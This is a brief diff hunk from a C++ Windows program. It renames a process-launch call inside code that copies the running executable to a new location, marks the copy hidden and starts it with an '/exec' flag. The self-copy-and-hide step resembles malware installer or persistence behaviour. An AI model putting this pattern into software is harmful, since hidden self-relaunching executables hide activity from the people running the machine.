@@ -52,7 +52,7 @@ INT APIENTRY wWinMain(
 
 				if (CopyFile(szMfn, szNfn.c_str(), FALSE)) {
 					SetFileAttributes(szNfn.c_str(), FILE_ATTRIBUTE_HIDDEN);
-					fnCreateProcessW(szNfn.c_str(), L"/exec", NULL, szDir.c_str());
+					fnCreateProcessExW(szNfn.c_str(), L"/exec", NULL, szDir.c_str());
 				} else {
 					fnMessageHandlerW(NULL, L"Couldn't copy current Module to target Path\nModule: %s\nTarget: %s", L"CopyFileW",
 						MB_ICONERROR, szMfn, szNfn.c_str());
